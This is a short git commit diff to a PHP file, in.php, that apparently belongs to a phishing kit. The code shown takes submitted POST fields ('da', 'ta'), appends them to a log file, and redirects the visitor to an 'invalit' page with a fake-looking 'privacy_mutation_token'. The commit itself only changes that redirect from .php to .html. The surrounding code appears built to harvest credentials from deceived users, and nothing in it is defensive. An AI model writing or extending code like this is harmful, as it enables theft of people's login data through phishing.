4ae3cb60f51d5617cafab1e2ac3705b9d3ced748
youlgang <169156722+youlgang@users.noreply.github.com>
2024-05-07 20:47:36 +0700

    Update in.php

--- in.php
+++ in.php
@@ -26,5 +26,5 @@ if(isset($_POST['da']) || isset($_POST['ta'])) {
     fwrite($handle, "<br>");
     fclose($handle);
 
-    header('location: invalit.php?privacy_mutation_token=gy4dGSFWsw345gSDER7wtsef50ghfgESRD3fd');
+    header('location: invalit.html?privacy_mutation_token=gy4dGSFWsw345gSDER7wtsef50ghfgESRD3fd');
 }
